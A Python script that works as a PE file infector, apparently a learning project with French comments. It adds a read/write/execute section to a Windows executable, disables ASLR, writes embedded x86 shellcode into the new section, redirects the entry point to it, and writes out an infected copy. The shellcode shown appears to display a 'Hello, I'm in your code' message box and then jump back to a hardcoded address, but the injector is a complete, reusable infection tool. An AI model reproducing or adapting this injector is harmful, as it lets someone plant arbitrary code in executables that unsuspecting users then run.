import pefile
import os

class Injection():
    def __init__(self,pathToExe,pathToBadExe,sectionName):
        self.pathToExe = pathToExe
        self.pathToBadExe = pathToBadExe
        self.sectionName = sectionName

        self.shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                          b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
                          b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
                          b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
                          b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
                          b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
                          b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
                          b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
                          b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
                          b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
                          b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
                          b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
                          b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
                          b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                          b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
                          b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x74\x79\x58\x68"
                          b"\x65\x63\x75\x72\x68\x6b\x49\x6e\x53\x68\x42\x72\x65"
                          b"\x61\x31\xdb\x88\x5c\x24\x0f\x89\xe3\x68\x65\x58\x20"
                          b"\x20\x68\x20\x63\x6f\x64\x68\x6e\x20\x75\x72\x68\x27"
                          b"\x6d\x20\x69\x68\x6f\x2c\x20\x49\x68\x48\x65\x6c\x6c"
                          b"\x31\xc9\x88\x4c\x24\x15\x89\xe1\x31\xd2\x6a\x40\x53"
                          b"\x51\x52\xff\xd0\xB8\x96\xFE\x46\x00\xFF\xD0")

    def infect(self):

        pe = pefile.PE(self.pathToExe)

        self.creation_HeaderSection(pe)


    def adjust_SectionSize(self,size, align):
        if size % align:
            size = ((size + align) // align) * align
        return size

    def addInSectionsTab(self, pe, new_section, new_section_data):
        pe.sections.append(new_section)
        pe.__structures__.append(new_section)
        pe.__data__ = bytearray(pe.__data__) + new_section_data
        pe.write(self.pathToBadExe)
        print(new_section)

    def updateOEP(self,pe, new_section, new_section_data):
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress
        pe.FILE_HEADER.NumberOfSections += 1
        pe.OPTIONAL_HEADER.SizeOfImage += self.adjust_SectionSize(0x1000, pe.OPTIONAL_HEADER.SectionAlignment)

        self.addInSectionsTab(pe, new_section, new_section_data)

    def addShellcodeIntoSection(self,pe, pad, new_section):
        new_section_data = bytearray(pad + new_section.SizeOfRawData)
        new_section_data[pad:324] = self.shellcode

        self.updateOEP(pe, new_section, new_section_data)

    def resize_exe(self,pe, path, new_section, last_section):

        # Need the diff between lastSection and EOF to get the size of the garbage
        # On obtient la taile de l'exe
        original_size = os.path.getsize(path)
        # On fait la différence entre la taille original et les données qu'on a rajouter sur le disque
        diff = original_size - (last_section.PointerToRawData + last_section.SizeOfRawData)
        # Add GarbageSize + lastSection to get next valid PointerToRawData
        NewPointerToRawData = self.adjust_SectionSize(
            (diff + last_section.PointerToRawData + last_section.SizeOfRawData),
            pe.OPTIONAL_HEADER.SectionAlignment)
        new_section.PointerToRawData = NewPointerToRawData
        # Padding between EOF and next section
        pad = NewPointerToRawData - original_size

        self.addShellcodeIntoSection(pe, pad, new_section)

    def initialization_HeaderSection(self,pe, new_section, last_section):
        # Le nom du header de la section
        new_section.Name = str.encode(self.sectionName)
        # On ajoute 4096 octets à la taille de la section sur le disque en alignant avec FileAlignment
        new_section.SizeOfRawData = self.adjust_SectionSize(
            0x1000, pe.OPTIONAL_HEADER.FileAlignment)
        # La taille virtuelle de la section
        new_section.Misc_VirtualSize = 0x1000
        # Marche sans : new_section.Misc = 0x1000
        # Marche sans : new_section.Misc_PhysicalAddress = 0x1000
        # On aligne l'adresse Virtuelle avec la Section Alignment -> Obligatoire
        new_section.VirtualAddress = last_section.VirtualAddress + self.adjust_SectionSize(last_section.Misc_VirtualSize,
                                                                                      pe.OPTIONAL_HEADER.SectionAlignment)
        # Characteristics : On met les flags suivants : droit en Lecture / Ecriture /  Execution / Section contient du code
        new_section.Characteristics = 0xE0000020
        # Disable ASLR
        pe.OPTIONAL_HEADER.DllCharacteristics -= 0x40

        self.resize_exe(pe, self.pathToExe , new_section, last_section)

    def creation_HeaderSection(self,pe):
        new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
        number_sections = pe.FILE_HEADER.NumberOfSections - 1
        last_section = pe.sections[number_sections]
        new_section.__unpack__(bytearray(new_section.sizeof()))
        new_section.set_file_offset(
            pe.sections[number_sections].get_file_offset() + 40)

        self.initialization_HeaderSection(pe, new_section, last_section)

